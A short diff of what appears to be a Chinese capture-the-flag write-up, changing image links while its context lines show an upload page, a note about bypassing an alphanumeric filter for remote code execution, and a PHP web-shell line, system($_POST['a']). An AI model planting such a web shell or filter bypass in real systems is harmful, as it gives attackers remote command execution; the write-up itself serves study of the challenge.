@@ -1,16 +1,16 @@
-![[Pasted image 20230220192219.png|500]]
+![](<./img/Pasted image 20230220192219.png>)
 
 ```
 /index.php
 ```
 
-![[Pasted image 20230220192242.png|500]]
+![](<./img/Pasted image 20230220192242.png>)
 
 ```
 /index.php?act=upload
 ```
 
-![[Pasted image 20230220192325.png|800]]
+![](<./img/Pasted image 20230220192325.png>)
 
 无字母数字RCE，考虑使用汉字绕过
 
@@ -90,9 +90,9 @@ payload
 system($_POST['a']);
 ```
 
-![[Pasted image 20230220193201.png|800]]
+![](<./img/Pasted image 20230220193201.png>)
 
-![[Pasted image 20230220193226.png|1000]]
+![](<./img/Pasted image 20230220193226.png>)
 
 ```shell
 ls /
